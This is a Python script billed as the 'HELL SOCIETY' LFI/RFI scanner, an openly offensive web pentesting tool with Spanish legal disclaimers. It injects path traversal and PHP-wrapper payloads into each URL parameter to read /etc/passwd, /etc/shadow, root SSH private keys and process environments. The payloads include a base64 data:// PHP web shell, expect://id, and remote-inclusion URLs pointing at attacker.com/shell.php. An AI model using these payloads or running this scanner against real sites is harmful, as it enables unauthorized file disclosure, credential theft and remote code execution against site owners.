#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  LFI / RFI SCANNER v2.0                                          ║
║  Created by: HELL SOCIETY Community                              ║
║  Category: Offensive - Web Pentesting                            ║
╚══════════════════════════════════════════════════════════════════╝

ADVERTENCIA LEGAL: El uso de esta herramienta sin autorización
escrita del propietario del sistema objetivo es ILEGAL.
Los creadores NO se hacen responsables del mal uso de esta herramienta.
"""

import requests
import sys
import colorama
from colorama import Fore, Back, Style
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import argparse

colorama.init(autoreset=True)

BANNER = f"""
{Fore.YELLOW}╔══════════════════════════════════════════════════════════════════╗
║{Fore.RED}  ██╗      █████╗ ██╗   ██╗ ██████╗██╗  ██╗███████╗██████╗      {Fore.YELLOW}║
║{Fore.RED}  ██║     ██╔══██╗██║   ██║██╔════╝██║ ██╔╝██╔════╝██╔══██╗     {Fore.YELLOW}║
║{Fore.RED}  ██║     ███████║██║   ██║██║     █████╔╝ █████╗  ██████╔╝     {Fore.YELLOW}║
║{Fore.RED}  ██║     ██╔══██║██║   ██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗     {Fore.YELLOW}║
║{Fore.RED}  ███████╗██║  ██║╚██████╔╝╚██████╗██║  ██╗███████╗██║  ██║     {Fore.YELLOW}║
║{Fore.RED}  ╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝     {Fore.YELLOW}║
╠══════════════════════════════════════════════════════════════════╣
║{Fore.CYAN}  HELL SOCIETY - LFI/RFI Scanner v2.0                                   {Fore.YELLOW}║
╚══════════════════════════════════════════════════════════════════╝
"""

DISCLAIMER = f"""
{Fore.RED}{Back.BLACK}
[!] ADVERTENCIA LEGAL [!]
Esta herramienta es para uso en pentesting AUTORIZADO únicamente.
Los creadores (HELL SOCIETY) NO se hacen responsables del mal uso.
"""

LFI_PAYLOADS = [
    '../../../etc/passwd',
    '....//....//....//etc/passwd',
    '.../.../.../etc/passwd',
    '../../../../../../../etc/passwd',
    '../../../../../../../../etc/passwd',
    '../../../../../../../../../etc/passwd',
    '../../../../../../../../../../etc/passwd',
    '..%2F..%2F..%2Fetc%2Fpasswd',
    '..%252f..%252f..%252fetc%252fpasswd',
    '%2e%2e/%2e%2e/%2e%2e/etc/passwd',
    '/var/log/apache2/access.log',
    '/var/log/apache2/error.log',
    '/var/log/nginx/access.log',
    '/var/log/nginx/error.log',
    '/var/log/auth.log',
    '/var/log/syslog',
    '/var/log/messages',
    '/proc/self/environ',
    '/proc/self/fd/0',
    '/proc/self/fd/1',
    '/proc/self/fd/2',
    '/proc/version',
    '/proc/cmdline',
    '/etc/shadow',
    '/etc/hosts',
    '/etc/hostname',
    '/etc/resolv.conf',
    '/root/.ssh/id_rsa',
    '/root/.ssh/authorized_keys',
    '/home/www-data/.ssh/id_rsa',
    'php://filter/convert.base64-encode/resource=index.php',
    'php://input',
    'php://filter/read=convert.base64-encode/resource=config.php',
    'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=',
    'expect://id',
    'zip://shell.zip%23shell.php',
    'php://filter/string.rot13/resource=index.php',
]

RFI_PAYLOADS = [
    'http://attacker.com/shell.txt',
    'http://attacker.com/shell.php',
    'ftp://attacker.com/shell.txt',
    'https://attacker.com/shell.txt',
    '//attacker.com/shell.txt',
]

class LFIScanner:
    def __init__(self, target, timeout=10):
        self.target = target
        self.timeout = timeout
        self.vulns = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) HellSociety/2.0'
        })

    def get_params(self):
        parsed = urlparse(self.target)
        return parse_qs(parsed.query)

    def modify_url(self, param, payload):
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                          parsed.params, new_query, parsed.fragment))

    def scan(self):
        params = self.get_params()
        if not params:
            print(f"{Fore.RED}  [!] No parameters found in URL")
            return

        indicators = ['root:', 'bin:', 'daemon:', 'nobody:', 'www-data:',
                      'sshd:', 'mysql:', 'Linux version', 'Apache/', 'nginx/',
                      'DOCTYPE', '<?php', 'base64', 'system(', 'exec(']

        total = len(params) * len(LFI_PAYLOADS)
        current = 0

        print(f"{Fore.CYAN}  [*] Testing {len(params)} parameter(s) with {len(LFI_PAYLOADS)} LFI payloads")
        print(f"{Fore.CYAN}  [*] Total tests: {total}\n")

        for param in params:
            for payload in LFI_PAYLOADS:
                current += 1
                progress = (current / total) * 100
                bar_length = 40
                filled = int(bar_length * current / total)
                bar = f"{Fore.GREEN}█{Style.RESET_ALL}" * filled + f"{Fore.RED}░{Style.RESET_ALL}" * (bar_length - filled)
                print(f"\r{Fore.CYAN}  [{bar}] {progress:.1f}% - Testing: {param}={payload[:40]}", end="", flush=True)

                test_url = self.modify_url(param, payload)
                try:
                    response = self.session.get(test_url, timeout=self.timeout)
                    content = response.text

                    for indicator in indicators:
                        if indicator in content:
                            result = {
                                'param': param,
                                'payload': payload,
                                'type': 'LFI',
                                'indicator': indicator,
                                'status': response.status_code
                            }
                            self.vulns.append(result)
                            print(f"\n")
                            print(f"  {Fore.GREEN}[+] LFI VULNERABLE!")
                            print(f"  {Fore.GREEN}  Parameter: {Fore.WHITE}{param}")
                            print(f"  {Fore.GREEN}  Payload: {Fore.YELLOW}{payload}")
                            print(f"  {Fore.GREEN}  Indicator: {Fore.WHITE}{indicator}")
                            print(f"  {Fore.GREEN}  Status: {response.status_code}")
                            print(f"  {Fore.CYAN}  {'─' * 60}")
                            break

                except requests.exceptions.Timeout:
                    pass
                except requests.exceptions.RequestException:
                    pass

    def print_results(self):
        if not self.vulns:
            print(f"\n\n{Fore.YELLOW}  [!] No LFI vulnerabilities found")
            return

        print(f"\n\n{Fore.RED}{Back.BLACK}  SCAN COMPLETE - {len(self.vulns)} VULNERABILITY(IES) FOUND  ")
        print(f"{Fore.CYAN}  {'═' * 60}")

        for i, v in enumerate(self.vulns, 1):
            print(f"\n  {Fore.CYAN}[{i}] {Fore.WHITE}Param: {v['param']}")
            print(f"      {Fore.YELLOW}Payload: {v['payload']}")
            print(f"      {Fore.GREEN}Type: {v['type']} | Indicator: {v['indicator']}")

def main():
    print(BANNER)
    print(DISCLAIMER)

    parser = argparse.ArgumentParser(description='Hell Society LFI/RFI Scanner')
    parser.add_argument('-u', '--url', required=True, help='Target URL with parameters')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='Request timeout')
    args = parser.parse_args()

    scanner = LFIScanner(args.url, args.timeout)
    print(f"{Fore.CYAN}  [*] Target: {Fore.WHITE}{args.url}")
    print(f"{Fore.CYAN}  [*] Starting LFI/RFI scan...\n")

    scanner.scan()
    scanner.print_results()

if __name__ == "__main__":
    main()
